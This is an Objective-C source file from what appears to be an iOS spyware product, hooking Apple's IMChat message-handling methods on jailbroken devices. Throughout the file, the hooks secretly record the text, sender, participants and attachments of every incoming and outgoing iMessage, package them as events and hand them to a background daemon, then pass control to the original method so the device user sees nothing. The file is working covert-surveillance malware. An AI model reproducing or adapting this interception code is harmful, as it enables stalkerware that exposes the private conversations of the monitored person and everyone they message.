//
//  IMessage.h
//  MSFSP
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSFSP.h"
#import "MSFSPUtils.h"
#import "IMChat.h"
#import "IMChat+IOS6.h"
#import "IMChat+iOS8.h"
#import "IMMessage.h"
#import "IMHandle.h"
#import "IMAccount.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "IMessageUtils.h"
#import "DefStd.h"
#import "StringUtils.h"
#import "NSConcreteAttributedString.h"
#import "IMFileTransferCenter.h"
#import "IMFileTransfer.h"

#import "IMMessageItem.h"

#pragma mark - Incoming iMessage -

HOOK(IMChat, _handleIncomingMessage$, BOOL, id arg1) { // Tested 4s 5.1.1, 8.1
    IMMessage *message = (IMMessage *)arg1;    
	DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IN @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
	DLog (@"IN message = %@", message);
	DLog (@"hasInlineAttachments: %d, isFromMe: %d, messageID: %lld", [message hasInlineAttachments], [message isFromMe], [message messageID]);
	//NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	//DLog("App identifier %@", identifier )
	IMAccount *account = [self account];
	NSString *serviceName = [account serviceName]; // Service name for sms/mms is SMS
	
	DLog (@"serviceName of message = %@", serviceName);
	
	if(![message isFromMe] && ([message messageID] > 0) && // fromMe method is no longer exist in IOS 6
	   ([message messageID] > [[IMessageUtils shareIMessageUtils] mLastMessageID]) &&
	   ([serviceName isEqualToString:@"iMessage"] || [serviceName isEqualToString:@"Madrid"])) {
		
		DLog(@"lastMessageID: %ld", (long)[[IMessageUtils shareIMessageUtils] mLastMessageID]);
		[[IMessageUtils shareIMessageUtils] setMLastMessageID:[message messageID]];
		NSString *msg = [message summaryString];
		DLog (@"================ >>>>>> text: %@", msg)
		
		//Convert msg to NSUTF8StringEncoding for emoji
		//NSData *temp = [msg dataUsingEncoding:NSNonLossyASCIIStringEncoding];
		//NSString *goodValue = [[NSString alloc] initWithData:temp encoding:NSUTF8StringEncoding];
		//DLog (@"============================================")
		//DLog (@"================ >>>>>> goodValue: %@", goodValue)
		//DLog (@"============================================")
		//[goodValue release];
		
		//---------------------- Partipcipants --------------------
		NSMutableArray *participants = [NSMutableArray array];
		
		IMHandle *sender = [message sender];
		
		DLog (@"================= sender ====================");
		DLog (@"account         = %@", [sender account]);				// It will return target account
		DLog (@"uniqueID        = %@", [[sender account] uniqueID]);
		DLog (@"displayName     = %@", [[sender account] displayName]);
		
		DLog (@"ID              = %@", [sender ID]);
		DLog (@"uniqueName      = %@", [sender uniqueName]);
		DLog (@"name            = %@", [sender name]);
		DLog (@"fullName        = %@", [sender fullName]);
		DLog (@"nameAndID       = %@", [sender nameAndID]);
		DLog (@"normalizedID    = %@", [sender normalizedID]);
		DLog (@"displayID       = %@", [sender displayID]);
		DLog (@"================= sender ====================");
		
		/*
		 NOTE:
		 UserID: is a sender of this message
		 Partipcipants: is all participants exclude sender (UserID) of this message
		 
		 - INCOMING:
		 1. Single chat: participant is only one which is the sender of this message
		 2. Group chat: participants are all exclude target account itself
		 
		 Thus either case we must include target account itself as participant
		 
		 NEW IM event structure require ***
		 - First recipient must be target in the case incoming IM
		 */
		
		DLog (@"================= account ====================");
		DLog (@"login           = %@", [account login]);
		DLog (@"ID              = %@", [[account loginIMHandle] ID]);
		DLog (@"loginDisplayID  = %@", [[account loginIMHandle] displayID]);
		DLog (@"loginName       = %@", [[account loginIMHandle] name]);
		DLog (@"myStatusMessage = %@", [account myStatusMessage]);
		DLog (@"myPictureData   = %@", [account myPictureData]);
		DLog (@"uniqueID        = %@", [account uniqueID]);
		DLog (@"displayName     = %@", [account displayName]);
		DLog (@"name            = %@", [account name]);
		DLog (@"internalName    = %@", [account internalName]);
		DLog (@"shortName       = %@", [account shortName]);
		DLog (@"================= account ====================");
		
		DLog (@"================= self ====================");
		DLog (@"roomName        = %@", [self roomName]);
		DLog (@"guid            = %@", [self guid]);
		DLog (@"================= self ====================");
		
		// This information must match to userId in outgoing method
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:[[account loginIMHandle] ID]]; // p:08xx or e:forum.this@gmail.com
		[participant setRecipContactName:[[account loginIMHandle] displayID]];
		[participants addObject:participant];
		[participant release];
		
		DLog (@"Participants of this chat = %@", [self participants]);
		
		for (IMHandle *participantIM in [self participants]) {
			DLog (@"================= participant IN ====================");
			DLog (@"name         = %@", [participantIM name]);
			DLog (@"displayID    = %@", [participantIM displayID]);
			DLog (@"ID           = %@", [participantIM ID]);
			DLog (@"================= participant IN ====================");
			
			// Participant's displayID/name must not equal to sender's displayID/name
			if (![[sender displayID] isEqualToString:[participantIM displayID]] ||
				![[sender name] isEqualToString:[participantIM name]]) {
				NSString *displayID = [participantIM displayID];
				NSString *numberAddress = [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
				
				// This information must match to all participants in outgoing method
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:numberAddress]; 
				//[participant setRecipNumAddr:[participantIM displayID]];// +668xxx (some time)
				[participant setRecipContactName:[participantIM name]]; // Contact name or 08xxx
				[participants addObject:participant];
				[participant release];
			}
		}
		
		////////////////////////////////////////////////////
		// This information must match to one of participants in outgoing method
		NSString *displayID = [sender displayID];
		NSString *userId = [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
		NSString *displayName = [sender name];
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMIMServiceID:kIMServiceIDiMessage];
		[imEvent setMDirection:kEventDirectionIn];
		[imEvent setMMessage:msg];		
		[imEvent setMUserID:userId];
		[imEvent setMUserDisplayName:displayName];
		
		// Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
		NSString * conversationId = nil;
		for (int i = 0; i < [[self participants]count]; i++){
			IMHandle * handle = [[self participants]objectAtIndex:i];
			if (i == 0){
				conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
			} else {
				conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
			}
		}
		DLog(@"conversationId %@",conversationId);
		
		// Chat name
		NSString * chatIdentifier = nil;
		for (int i = 0; i < [[self participants]count]; i++){
			IMHandle * handle = [[self participants]objectAtIndex:i];
			if (i == 0){
				chatIdentifier = [NSString stringWithFormat:@"%@",[handle name]];
			} else {
				chatIdentifier = [NSString stringWithFormat:@"%@,%@",chatIdentifier,[handle name]];
			}
		}
		// Handle name will return +668xxx for single chat (unlike outgoing which is 08xxx)
		DLog(@"ChatIdentifier %@",chatIdentifier);

		[imEvent setMParticipants:participants];
		[imEvent setMAttachments:[NSArray array]];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		
		// New fields...
		[imEvent setMServiceID:kIMServiceiMessage];
		[imEvent setMConversationID:conversationId];
		[imEvent setMConversationName:chatIdentifier];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		
		//Capture Location , File Sharing ,Share Contact
		if([message hasInlineAttachments]) {
			//=========Fix msg just delete it if cause error
			if([msg length]==0){
				[imEvent setMRepresentationOfMessage:kIMMessageNone];
			}
			//=========Fix msg just delete it if cause error
			[IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
			[NSThread sleepForTimeInterval:1.0];
		}else{		
			NSMutableData* data			= [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:imEvent forKey:kiMessageArchived];
			[archiver finishEncoding];
			[IMessageUtils sendData:data];
			[archiver release];
			[data release];
		}
		[imEvent release];
	} else if ( [[[UIDevice currentDevice] systemVersion] floatValue] >= 7.0				&&
			   [message isFromMe]															&&
			   [message messageID] > 0														&&
			   [message messageID] > [[IMessageUtils shareIMessageUtils] mLastMessageID]	&&
			   [serviceName isEqualToString:@"iMessage"]									&&
			   [message hasInlineAttachments]												){
		
		Class $IMFileTransferCenter			= objc_getClass("IMFileTransferCenter");
		IMFileTransferCenter * imfilecenter = [$IMFileTransferCenter sharedInstance];
		id imfilereturn						= [imfilecenter transferForGUID:[[message fileTransferGUIDs]objectAtIndex:0] includeRemoved:YES];
		IMFileTransfer * imfile				= (IMFileTransfer *)imfilereturn;
		DLog (@"Filename [%@]", [imfile filename])

		NSRange checkTypeVCF			= [[imfile filename] rangeOfString:@".vcf" options:NSCaseInsensitiveSearch];
		NSRange checkTypeRecordedAudio	= [[imfile filename] rangeOfString:@".m4a" options:NSCaseInsensitiveSearch];
		
		if (checkTypeVCF.location			!= NSNotFound	||	// Shared Contact, Shared Location
			checkTypeRecordedAudio.location != NSNotFound	){	// Voice Memo Record File
			DLog (@"&&&&&&&&&&&&&&&&&	OUTGOING [VOICE, CONTACT, OR LOCATION]	&&&&&&&&&&&&&&&&&&&")		
			DLog (@"lastMessageID: %ld", (long)[[IMessageUtils shareIMessageUtils] mLastMessageID]);
			[[IMessageUtils shareIMessageUtils] setMLastMessageID:[message messageID]];
			
			NSString *msg =	[message summaryString];
			DLog (@"================ >>>>>> text: %@", msg)
			DLog (@"================= account ====================");			
			DLog (@"login               = %@", [account login]);
			DLog (@"loginDisplayID      = %@", [[account loginIMHandle] displayID]);
			DLog (@"loginName           = %@", [[account loginIMHandle] name]);
			DLog (@"myStatusMessage     = %@", [account myStatusMessage]);
			DLog (@"myPictureData       = %@", [account myPictureData]);
			DLog (@"uniqueID            = %@", [account uniqueID]);
			DLog (@"displayName         = %@", [account displayName]);
			DLog (@"name                = %@", [account name]);
			DLog (@"internalName        = %@", [account internalName]);
			DLog (@"shortName           = %@", [account shortName]);
			DLog (@"================= account ====================");
			
			DLog (@"================= self ====================");
			DLog (@"roomName = %@", [self roomName]);
			DLog (@"guid = %@", [self guid]);
			DLog (@"================= self ====================");
			//---------------------- Partipcipants --------------------
			NSMutableArray *participants = [NSMutableArray array];
			// Participants
			for (IMHandle *imHandle in [self participants]) {
				DLog (@"================= participant OUT ====================");
				DLog (@"name         = %@", [imHandle name]);
				DLog (@"displayID    = %@", [imHandle displayID]);
				DLog (@"ID           = %@", [imHandle ID]);
				DLog (@"================= participant OUT ====================");
				
				NSString *displayID			= [imHandle displayID];
				NSString *numberAddress		= [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
				
				// This information must match to all participants in incoming method
				FxRecipient *participant	= [[FxRecipient alloc] init];
				[participant setRecipNumAddr:numberAddress]; // +668xxx (some time)
				//[participant setRecipNumAddr:[imHandle displayID]]; // 08xxx
				[participant setRecipContactName:[imHandle name]]; // Contact name or 08xxx
				[participants addObject:participant];
				[participant release];
			}
			
			FxIMEvent *imEvent = [[FxIMEvent alloc] init];
			[imEvent setMIMServiceID:kIMServiceIDiMessage];
			[imEvent setMDirection:kEventDirectionOut];
			[imEvent setMMessage:msg];
			
			// This information must match to userId of incoming method
			[imEvent setMUserID:[[account loginIMHandle] ID]]; // p:08xx or e:forum.this@gmail.com
			[imEvent setMUserDisplayName:[[account loginIMHandle] displayID]];
			DLog (@"***********[account login]                      = %@", [account login]);
			DLog (@"***********[[account loginIMHandle] ID]         = %@", [[account loginIMHandle] ID]);
			DLog (@"***********[[account loginIMHandle] displayID]  = %@", [[account loginIMHandle] displayID]);
			DLog (@"***********[[account loginIMHandle] name]       = %@", [[account loginIMHandle] name]);
			DLog (@"***********[[account loginIMHandle] fullName]   = %@", [[account loginIMHandle] fullName]);
			DLog (@"***********[[account loginIMHandle] nameAndID]  = %@", [[account loginIMHandle] nameAndID]);
			
			[imEvent setMParticipants:participants];
			[imEvent setMAttachments:[NSArray array]];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			
			// Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
			NSString * conversationId = nil;
			for (int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if (i == 0) {
					conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
				} else {
					conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
				}
			}
			DLog(@"conversationId %@",conversationId);
			
			// Chat name
			NSString * chatIdentifier = nil;
			for (int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if (i == 0) {
					chatIdentifier = [NSString stringWithFormat:@"%@",[handle name]];
				} else {
					chatIdentifier = [NSString stringWithFormat:@"%@,%@",chatIdentifier,[handle name]];
				}
			}
			DLog(@"ChatIdentifier %@",chatIdentifier);
			
			// New fields...
			[imEvent setMServiceID:kIMServiceiMessage];
			[imEvent setMConversationID:conversationId];
			[imEvent setMConversationName:chatIdentifier];
			[imEvent setMRepresentationOfMessage:kIMMessageText];
			
			//Capture Location , File Sharing ,Share Contact
			if([message hasInlineAttachments]) {
				//=========Fix msg just delete it if cause error
				if([msg length]==0){
					[imEvent setMRepresentationOfMessage:kIMMessageNone];
				}
				//=========Fix msg just delete it if cause error
				[IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
				[NSThread sleepForTimeInterval:1.0];
			}
			
			[imEvent release];
		}								
	} else {
		DLog (@"####### IGNORED ######")
	}
	return CALL_ORIG(IMChat, _handleIncomingMessage$, arg1);
}

// iOS 8,9
HOOK(IMChat, _handleIncomingItem$, bool, id arg1) { // Tested 8.1,9.0.2
    DLog (@"####### arg1 = %@ ######", arg1); // IMMessageItem
    
    IMMessageItem *messageItem = arg1;
    IMMessage *message = [messageItem message];
    DLog(@"IMMessage from messageItem, %@", message);
    
    if (message) {
        IMAccount *account = [self account];
        NSString *serviceName = [account serviceName]; // Service name for sms/mms is SMS
        
        IMessageUtils *iMessageUtils = [IMessageUtils shareIMessageUtils];
        
        if (![message isFromMe] && ([message messageID] > 0) &&
            ([message messageID] > [iMessageUtils mLastMessageID]) &&
            [serviceName isEqualToString:@"iMessage"]) {
            
            DLog(@"lastMessageID: %ld", (long)[iMessageUtils mLastMessageID]);
            [iMessageUtils setMLastMessageID:[message messageID]];
            
            FxIMEvent *imEvent = [IMessageUtils incomingIMEventWithChat:self message:message];
            
            // Capture Location, File Sharing, Shared Contact, ....
            if ([message hasInlineAttachments]) {
                if([[imEvent mMessage] length]==0){
                    [imEvent setMRepresentationOfMessage:kIMMessageNone];
                }
                [IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
                [NSThread sleepForTimeInterval:1.0];
                
            } else {
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
                [archiver encodeObject:imEvent forKey:kiMessageArchived];
                [archiver finishEncoding];
                [IMessageUtils sendData:data];
                [archiver release];
                [data release];
            }
        }
    }
    return CALL_ORIG(IMChat, _handleIncomingItem$, arg1);
}

#pragma mark - Outgoing iMessage -

HOOK(IMChat, sendMessage$, void, id arg1) {  // Tested 4s 5.1.1,8.1,9.0.2
	DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ OUT @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")

	IMMessage *message = (IMMessage *)arg1;
	
	DLog(@"OUT message = %@", message);     // IMMessage
	DLog(@"hasInlineAttachments: %d, isFinished: %d", [message hasInlineAttachments], [message isFinished]);
	
	//NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	//DLog("App identifier = %@", identifier)
	
	IMAccount *account = [self account];
	NSString *serviceName = [account serviceName]; // Service name for sms/mms is SMS
	DLog (@"account = %@", account);
	DLog (@"serviceName of message = %@", serviceName);
	
    if ([message isFinished]) {
        if ([message isFromMe]  &&
            ([serviceName isEqualToString:@"iMessage"] || [serviceName isEqualToString:@"Madrid"]) &&
            (([[message summaryString]length] > 0 && ![message hasInlineAttachments]) || [message hasInlineAttachments]) &&
            ![message error]) {
			
			NSString *msg = [message summaryString];
			DLog (@"================ >>>>>> text: %@", msg);
			
			//Convert msg to NSUTF8StringEncoding for emoji
			//NSData *temp = [msg dataUsingEncoding:NSNonLossyASCIIStringEncoding];
			//NSString *goodValue = [[NSString alloc] initWithData:temp encoding:NSUTF8StringEncoding];
			//DLog (@"================ >>>>>> goodValue: %@", goodValue);
			//[goodValue release];
			
			
			//---------------------- Partipcipants --------------------
			NSMutableArray *participants = [NSMutableArray array];
			
			/*
			 NOTE:
			 UserID: is a sender of this message
			 Partipcipants: is all participants exclude sender (UserID) of this message
			 
			 - OUTGOING:
			 1. Single chat: participant is only one which is the recipient of this message
			 2. Group chat: participants are all recipients of this message
			 */
			
			DLog (@"================= account ====================");
			DLog (@"login           = %@", [account login]);
			DLog (@"loginDisplayID  = %@", [[account loginIMHandle] displayID]);
			DLog (@"loginName       = %@", [[account loginIMHandle] name]);
			DLog (@"myStatusMessage = %@", [account myStatusMessage]);
			DLog (@"myPictureData   = %@", [account myPictureData]);
			DLog (@"uniqueID        = %@", [account uniqueID]);
			DLog (@"displayName     = %@", [account displayName]);
			DLog (@"name            = %@", [account name]);
			DLog (@"internalName    = %@", [account internalName]);
			DLog (@"shortName       = %@", [account shortName]);
			DLog (@"================= account ====================");
			
			DLog (@"================= self ====================");
			DLog (@"roomName        = %@", [self roomName]);
			DLog (@"guid            = %@", [self guid]);
			DLog (@"================= self ====================");
			
			
			// Participants
			for (IMHandle *imHandle in [self participants]) {
				DLog (@"================= participant OUT ====================");
				DLog (@"name         = %@", [imHandle name]);
				DLog (@"displayID    = %@", [imHandle displayID]);
				DLog (@"ID           = %@", [imHandle ID]);
				DLog (@"================= participant OUT ====================");
				
				NSString *displayID = [imHandle displayID];
				NSString *numberAddress = [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
				
				// This information must match to all participants in incoming method
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:numberAddress]; // +668xxx (some time)
				//[participant setRecipNumAddr:[imHandle displayID]]; // 08xxx
				[participant setRecipContactName:[imHandle name]]; // Contact name or 08xxx
				[participants addObject:participant];
				[participant release];
			}
			
			FxIMEvent *imEvent = [[FxIMEvent alloc] init];
			[imEvent setMIMServiceID:kIMServiceIDiMessage];
			[imEvent setMDirection:kEventDirectionOut];
			[imEvent setMMessage:msg];
			
			// This information must match to userId of incoming method
			[imEvent setMUserID:[[account loginIMHandle] ID]]; // p:08xx or e:forum.this@gmail.com
			[imEvent setMUserDisplayName:[[account loginIMHandle] displayID]];
			
			DLog (@"***********[account login]                      = %@", [account login]);
			DLog (@"***********[[account loginIMHandle] ID]         = %@", [[account loginIMHandle] ID]);
			DLog (@"***********[[account loginIMHandle] displayID]  = %@", [[account loginIMHandle] displayID]);
			DLog (@"***********[[account loginIMHandle] name]       = %@", [[account loginIMHandle] name]);
			DLog (@"***********[[account loginIMHandle] fullName]   = %@", [[account loginIMHandle] fullName]);
			DLog (@"***********[[account loginIMHandle] nameAndID]  = %@", [[account loginIMHandle] nameAndID]);
			
			[imEvent setMParticipants:participants];
			[imEvent setMAttachments:[NSArray array]];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			
			// Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
			NSString * conversationId = nil;
			for (int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if (i == 0) {
					conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
				} else {
					conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
				}
			}
			DLog(@"conversationId %@", conversationId);
			
			// Chat name
			NSString * chatIdentifier = nil;
			for (int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if (i == 0) {
					chatIdentifier = [NSString stringWithFormat:@"%@", [handle name]];
				} else {
					chatIdentifier = [NSString stringWithFormat:@"%@,%@", chatIdentifier, [handle name]];
				}
			}
			DLog(@"ChatIdentifier %@", chatIdentifier);
			
			// New fields...
			[imEvent setMServiceID:kIMServiceiMessage];
			[imEvent setMConversationID:conversationId];
			[imEvent setMConversationName:chatIdentifier];
			[imEvent setMRepresentationOfMessage:kIMMessageText];
			
			// Capture Location, File Sharing, Shared Contact
			if([message hasInlineAttachments]) {
				//=========Fix msg just delete it if cause error
				if([msg length]==0){
					[imEvent setMRepresentationOfMessage:kIMMessageNone];
				}
				//=========Fix msg just delete it if cause error
				[IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
				[NSThread sleepForTimeInterval:1.0];
			}else{
				NSMutableData* data = [[NSMutableData alloc] init];
				NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:imEvent forKey:kiMessageArchived];
				[archiver finishEncoding];
				[IMessageUtils sendData:data];
				[archiver release];
				[data release];
			}
			[imEvent release];
		}
	}
	
	CALL_ORIG(IMChat, sendMessage$, arg1);
}
